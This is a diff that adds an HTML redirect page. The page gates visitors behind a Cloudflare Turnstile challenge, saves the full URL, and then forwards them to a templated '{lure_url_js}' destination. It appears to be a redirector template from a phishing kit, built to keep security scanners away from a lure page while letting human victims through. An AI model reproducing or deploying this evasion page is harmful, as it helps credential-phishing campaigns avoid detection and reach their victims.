@@ -1,0 +1,48 @@
+<html>
+<head>
+    <title>Redirecting..</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+
+    <script>
+        if (!sessionStorage.getItem("page_refreshed")) {
+            sessionStorage.setItem("page_refreshed", "true");
+
+            // Inject meta refresh tag with 3-second delay
+            const meta = document.createElement("meta");
+            meta.httpEquiv = "refresh";
+            meta.content = "3"; // Refresh after 3 seconds
+            document.head.appendChild(meta);
+        }
+    </script>
+
+</head>
+<body>
+
+Loading...
+<div id="cf-turnstile"></div>
+
+<script>
+turnstile.ready(function () {
+        turnstile.render('#cf-turnstile', {
+            sitekey: '0x4AAAAAABk7D-oLKyPLqE6g', // replace this with your own sitekey
+            callback: function(token) {
+
+  const fullUrl = window.location.href;
+
+  console.debug("[Redirector] Full URL:", fullUrl);
+
+  // Store full URL (with query and hash) if either exists
+  if (fullUrl) {
+    sessionStorage.setItem("original_query", fullUrl);
+    console.debug("[Redirector] Stored full URL in sessionStorage.");
+  } else {
+    console.warn("[Redirector] No query string or hash found.");
+  }
+
+
+                window.location.assign({lure_url_js});
+            },
+        });
+    });
+</script>
+</body>
